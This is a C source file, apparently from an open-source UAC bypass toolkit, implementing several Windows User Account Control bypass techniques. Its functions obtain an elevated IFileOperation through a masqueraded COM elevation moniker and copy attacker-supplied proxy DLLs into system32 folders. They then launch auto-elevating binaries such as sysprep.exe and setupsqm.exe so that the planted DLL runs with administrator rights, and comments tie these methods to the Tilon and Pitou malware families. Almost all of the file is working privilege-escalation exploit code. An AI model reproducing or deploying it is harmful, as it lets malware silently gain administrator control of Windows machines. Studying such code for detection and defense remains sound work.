/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2014 - 2017
*
*  TITLE:       PITOU.C
*
*  VERSION:     2.71
*
*  DATE:        07 May 2017
*
*  Leo Davidson based IFileOperation auto-elevation.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/
#include "global.h"

/*
* ucmMasqueradedRenameElementCOM
*
* Purpose:
*
* Rename file/directory autoelevated.
* This function expects that supMasqueradeProcess was called on process initialization.
*
*/
BOOL ucmMasqueradedRenameElementCOM(
    _In_ LPWSTR OldName,
    _In_ LPWSTR NewName
)
{
    BOOL                bCond = FALSE, bResult = FALSE;
    IFileOperation     *FileOperation1 = NULL;
    IShellItem         *psiDestDir = NULL;
    HRESULT             r = E_FAIL;

    do {

        if ((OldName == NULL) || (NewName == NULL))
            break;

        r = CoCreateInstance(&CLSID_FileOperation, NULL,
            CLSCTX_INPROC_SERVER | CLSCTX_LOCAL_SERVER | CLSCTX_INPROC_HANDLER, &IID_IFileOperation, &FileOperation1);

        if (r != S_OK) {
            break;
        }

        if (FileOperation1 != NULL) {
            FileOperation1->lpVtbl->Release(FileOperation1);
        }

        r = ucmMasqueradedCoGetObjectElevate(
            T_CLSID_FileOperation,
            CLSCTX_INPROC_SERVER | CLSCTX_LOCAL_SERVER | CLSCTX_INPROC_HANDLER,
            &IID_IFileOperation, 
            &FileOperation1);

        if (r != S_OK) {
            break;
        }
        if (FileOperation1 == NULL) {
            r = E_FAIL;
            break;
        }

        FileOperation1->lpVtbl->SetOperationFlags(FileOperation1, g_ctx.IFileOperationFlags);

        r = SHCreateItemFromParsingName(OldName, NULL, &IID_IShellItem, &psiDestDir);
        if (r != S_OK) {
            break;
        }

        r = FileOperation1->lpVtbl->RenameItem(FileOperation1, psiDestDir, NewName, NULL);
        if (r != S_OK) {
            break;
        }

        r = FileOperation1->lpVtbl->PerformOperations(FileOperation1);
        if (r != S_OK) {
            break;
        }

        psiDestDir->lpVtbl->Release(psiDestDir);
        psiDestDir = NULL;

        bResult = TRUE;

    } while (bCond);

    if (FileOperation1 != NULL) {
        FileOperation1->lpVtbl->Release(FileOperation1);
    }

    if (psiDestDir != NULL) {
        psiDestDir->lpVtbl->Release(psiDestDir);
    }

    return bResult;
}

/*
* ucmMasqueradedCreateSubDirectoryCOM
*
* Purpose:
*
* Create directory autoelevated.
* This function expects that supMasqueradeProcess was called on process initialization.
*
*/
BOOL ucmMasqueradedCreateSubDirectoryCOM(
    _In_ LPWSTR ParentDirectory,
    _In_ LPWSTR SubDirectory
)
{
    BOOL                bCond = FALSE, bResult = FALSE;
    IFileOperation     *FileOperation1 = NULL;
    IShellItem         *psiDestDir = NULL;
    HRESULT             r = E_FAIL;

    do {

        if ((SubDirectory == NULL) || (ParentDirectory == NULL))
            break;

        r = CoCreateInstance(&CLSID_FileOperation, NULL,
            CLSCTX_INPROC_SERVER | CLSCTX_LOCAL_SERVER | CLSCTX_INPROC_HANDLER, &IID_IFileOperation, &FileOperation1);

        if (r != S_OK) {
            break;
        }

        if (FileOperation1 != NULL) {
            FileOperation1->lpVtbl->Release(FileOperation1);
        }

        r = ucmMasqueradedCoGetObjectElevate(
            T_CLSID_FileOperation,
            CLSCTX_INPROC_SERVER | CLSCTX_LOCAL_SERVER | CLSCTX_INPROC_HANDLER,
            &IID_IFileOperation,
            &FileOperation1);

        if (r != S_OK) {
            break;
        }
        if (FileOperation1 == NULL) {
            r = E_FAIL;
            break;
        }

        FileOperation1->lpVtbl->SetOperationFlags(FileOperation1, g_ctx.IFileOperationFlags);

        r = SHCreateItemFromParsingName(ParentDirectory, NULL, &IID_IShellItem, &psiDestDir);
        if (r != S_OK) {
            break;
        }

        r = FileOperation1->lpVtbl->NewItem(FileOperation1, psiDestDir, FILE_ATTRIBUTE_DIRECTORY, SubDirectory, NULL, NULL);
        if (r != S_OK) {
            break;
        }

        r = FileOperation1->lpVtbl->PerformOperations(FileOperation1);
        if (r != S_OK) {
            break;
        }

        psiDestDir->lpVtbl->Release(psiDestDir);
        psiDestDir = NULL;

        bResult = TRUE;

    } while (bCond);

    if (FileOperation1 != NULL) {
        FileOperation1->lpVtbl->Release(FileOperation1);
    }

    if (psiDestDir != NULL) {
        psiDestDir->lpVtbl->Release(psiDestDir);
    }

    return bResult;
}

/*
* ucmMasqueradedMoveCopyFileCOM
*
* Purpose:
*
* Move or Copy file autoelevated.
* This function expects that supMasqueradeProcess was called on process initialization.
*
*/
BOOL ucmMasqueradedMoveCopyFileCOM(
    _In_ LPWSTR SourceFileName,
    _In_ LPWSTR DestinationDir,
    _In_ BOOL fMove
)
{
    BOOL                cond = FALSE;
    IFileOperation     *FileOperation1 = NULL;
    IShellItem         *isrc = NULL, *idst = NULL;
    SHELLEXECUTEINFOW   shexec;
    HRESULT             r = E_FAIL;

    do {

        if ((SourceFileName == NULL) || (DestinationDir == NULL))
            break;

        RtlSecureZeroMemory(&shexec, sizeof(shexec));

        r = CoCreateInstance(&CLSID_FileOperation, NULL,
            CLSCTX_INPROC_SERVER | CLSCTX_LOCAL_SERVER | CLSCTX_INPROC_HANDLER, &IID_IFileOperation, &FileOperation1);

        if (r != S_OK)
            break;

        if (FileOperation1 != NULL)
            FileOperation1->lpVtbl->Release(FileOperation1);

        r = ucmMasqueradedCoGetObjectElevate(
            T_CLSID_FileOperation,
            CLSCTX_INPROC_SERVER | CLSCTX_LOCAL_SERVER | CLSCTX_INPROC_HANDLER,
            &IID_IFileOperation,
            &FileOperation1);

        if (r != S_OK)
            break;

        if (FileOperation1 == NULL) {
            r = E_FAIL;
            break;
        }

        FileOperation1->lpVtbl->SetOperationFlags(FileOperation1, g_ctx.IFileOperationFlags);

        r = SHCreateItemFromParsingName(SourceFileName, NULL, &IID_IShellItem, &isrc);
        if (r != S_OK)
            break;

        r = SHCreateItemFromParsingName(DestinationDir, NULL, &IID_IShellItem, &idst);
        if (r != S_OK)
            break;

        if (fMove)
            r = FileOperation1->lpVtbl->MoveItem(FileOperation1, isrc, idst, NULL, NULL);
        else
            r = FileOperation1->lpVtbl->CopyItem(FileOperation1, isrc, idst, NULL, NULL);

        if (r != S_OK)
            break;

        r = FileOperation1->lpVtbl->PerformOperations(FileOperation1);
        if (r != S_OK)
            break;

        idst->lpVtbl->Release(idst);
        idst = NULL;
        isrc->lpVtbl->Release(isrc);
        isrc = NULL;

    } while (cond);

    if (FileOperation1 != NULL)
        FileOperation1->lpVtbl->Release(FileOperation1);

    if (isrc != NULL)
        isrc->lpVtbl->Release(isrc);

    if (idst != NULL)
        idst->lpVtbl->Release(idst);

    return (SUCCEEDED(r));
}

/*
* ucmMasqueradedMoveFileCOM
*
* Purpose:
*
* Move file autoelevated.
* This function expects that supMasqueradeProcess was called on process initialization.
*
*/
BOOL ucmMasqueradedMoveFileCOM(
    _In_ LPWSTR SourceFileName,
    _In_ LPWSTR DestinationDir
)
{
    return ucmMasqueradedMoveCopyFileCOM(SourceFileName, DestinationDir, TRUE);
}

/*
* ucmStandardAutoElevation2
*
* Purpose:
*
* Bypass UAC by abusing appinfo g_lpAutoApproveEXEList
*
* UAC contain whitelist of trusted fusion processes with only names and no other special restrictions
* Most of them unknown shit and list does not properly handled by system itself, use this fact.
*
*/
BOOL ucmStandardAutoElevation2(
    CONST PVOID ProxyDll,
    DWORD ProxyDllSize
)
{
    BOOL  cond = FALSE, bResult = FALSE;
    WCHAR SourceFilePathAndName[MAX_PATH + 1];
    WCHAR DestinationFilePathAndName[MAX_PATH + 1];

    do {

        //source filename of dll
        RtlSecureZeroMemory(SourceFilePathAndName, sizeof(SourceFilePathAndName));
        _strcpy(SourceFilePathAndName, g_ctx.szTempDirectory);
        _strcat(SourceFilePathAndName, UNBCL_DLL);

        if (!supWriteBufferToFile(SourceFilePathAndName, ProxyDll, ProxyDllSize))
            break;

        //copy %temp\unbcl.dll -> system32\unbcl.dll
        if (!ucmMasqueradedMoveFileCOM(SourceFilePathAndName, g_ctx.szSystemDirectory))
            break;

        //source filename of process
        RtlSecureZeroMemory(SourceFilePathAndName, sizeof(SourceFilePathAndName));
        _strcpy(SourceFilePathAndName, g_ctx.szSystemDirectory);
        _strcat(SourceFilePathAndName, SYSPREP_DIR);
        _strcat(SourceFilePathAndName, SYSPREP_EXE);

        RtlSecureZeroMemory(DestinationFilePathAndName, sizeof(DestinationFilePathAndName));
        _strcpy(DestinationFilePathAndName, g_ctx.szTempDirectory);
        _strcat(DestinationFilePathAndName, OOBE_EXE);

        //system32\sysprep\sysprep.exe -> temp\oobe.exe
        if (!CopyFile(SourceFilePathAndName, DestinationFilePathAndName, FALSE)) {
            break;
        }

        //temp\oobe.exe -> system32\oobe.exe
        if (!ucmMasqueradedMoveFileCOM(DestinationFilePathAndName, g_ctx.szSystemDirectory)) {
            break;
        }

        RtlSecureZeroMemory(DestinationFilePathAndName, sizeof(DestinationFilePathAndName));
        _strcpy(DestinationFilePathAndName, g_ctx.szSystemDirectory);
        _strcat(DestinationFilePathAndName, OOBE_EXE);

        bResult = supRunProcess(DestinationFilePathAndName, NULL);

    } while (cond);

    return bResult;
}

/*
* ucmStandardAutoElevation
*
* Purpose:
*
* Leo Davidson AutoElevation method with derivatives.
*
* UacMethodSysprep1   - Original Leo Davidson concept.
* UacMethodSysprep2   - Windows 8.1 adapted UacMethodSysprep1 (bypassing sysprep embedded manifest dlls redirection).
* UacMethodTilon      - Leo Davidson concept with different target dll, used by Win32/Tilon.
* UacMethodSysprep3   - Windows 10 TH1 adapted UacMethodSysprep1.
* UacMethodOobe       - WinNT/Pitou derivative from Leo Davidson concept.
*
*/
BOOL ucmStandardAutoElevation(
    UCM_METHOD Method,
    CONST PVOID ProxyDll,
    DWORD ProxyDllSize
)
{
    BOOL    cond = FALSE, bResult = FALSE;
    WCHAR   szSourceDll[MAX_PATH * 2];
    WCHAR   szTargetDir[MAX_PATH * 2];
    WCHAR   szTargetProcess[MAX_PATH * 2];


    _strcpy(szSourceDll, g_ctx.szTempDirectory);
    _strcpy(szTargetDir, g_ctx.szSystemDirectory);
    _strcpy(szTargetProcess, g_ctx.szSystemDirectory);

    switch (Method) {

    case UacMethodSysprep1:

        //%temp%\cryptbase.dll
        _strcat(szSourceDll, CRYPTBASE_DLL);

        //%systemroot%\system32\sysprep      
        _strcat(szTargetDir, SYSPREP_DIR);

        //%systemroot%\system32\sysprep\sysprep.exe    
        _strcat(szTargetProcess, SYSPREP_DIR);
        _strcat(szTargetProcess, SYSPREP_EXE);

        break;

    case UacMethodSysprep2:

        //%temp\\shcore.dll
        _strcat(szSourceDll, SHCORE_DLL);

        //%systemroot%\system32\sysprep
        _strcat(szTargetDir, SYSPREP_DIR);

        //%systemroot%\system32\sysprep\sysprep.exe
        _strcat(szTargetProcess, SYSPREP_DIR);
        _strcat(szTargetProcess, SYSPREP_EXE);

        break;

    case UacMethodSysprep3:

        //%temp%\dbgcore.dll
        _strcat(szSourceDll, DBGCORE_DLL);

        //%systemroot%\system32\sysprep
        _strcat(szTargetDir, SYSPREP_DIR);

        //%systemroot%\system32\sysprep\sysprep.exe
        _strcat(szTargetProcess, SYSPREP_DIR);
        _strcat(szTargetProcess, SYSPREP_EXE);

        break;

    case UacMethodOobe:

        //%temp%\wdscore.dll
        _strcat(szSourceDll, WDSCORE_DLL);

        //%systemroot%\system32\oobe\"
        _strcat(szTargetDir, L"oobe\\");

        //%systemroot%\system32\oobe\setupsqm.exe
        _strcat(szTargetProcess, SETUPSQM_EXE);

        break;

    case UacMethodTilon:

        //%temp%\ActionQueue.dll
        _strcat(szSourceDll, ACTIONQUEUE_DLL);

        //%systemroot%\system32\sysprep
        _strcat(szTargetDir, SYSPREP_DIR);

        //%systemroot%\system32\sysprep\sysprep.exe
        _strcat(szTargetProcess, SYSPREP_DIR);
        _strcat(szTargetProcess, SYSPREP_EXE);

        break;

    default:
        return FALSE;
    }

    do {

        if (!supWriteBufferToFile(szSourceDll, ProxyDll, ProxyDllSize))
            break;

        if (!ucmMasqueradedMoveFileCOM(szSourceDll, szTargetDir))
            break;

        bResult = supRunProcess(szTargetProcess, NULL);

    } while (cond);

    return bResult;
}

/*
* ucmMasqueradedCoGetObjectElevate
*
* Purpose:
*
* CoGetObject elevation as admin.
*
*/
HRESULT ucmMasqueradedCoGetObjectElevate(
    _In_ LPWSTR clsid,
    _In_ DWORD dwClassContext,
    _In_ REFIID riid,
    _Outptr_ void **ppv
)
{
    HRESULT     r = E_FAIL;
    BIND_OPTS3  bop;
    WCHAR       szElevationMoniker[MAX_PATH];

    if (clsid == NULL)
        return r;

    if (_strlen(clsid) > 64)
        return r;

    RtlSecureZeroMemory(szElevationMoniker, sizeof(szElevationMoniker));

    _strcpy(szElevationMoniker, L"Elevation:Administrator!new:");
    _strcat(szElevationMoniker, clsid);

    RtlSecureZeroMemory(&bop, sizeof(bop));
    bop.cbStruct = sizeof(bop);
    bop.dwClassContext = dwClassContext;

    return CoGetObject(szElevationMoniker, (BIND_OPTS *)&bop, riid, ppv);
}
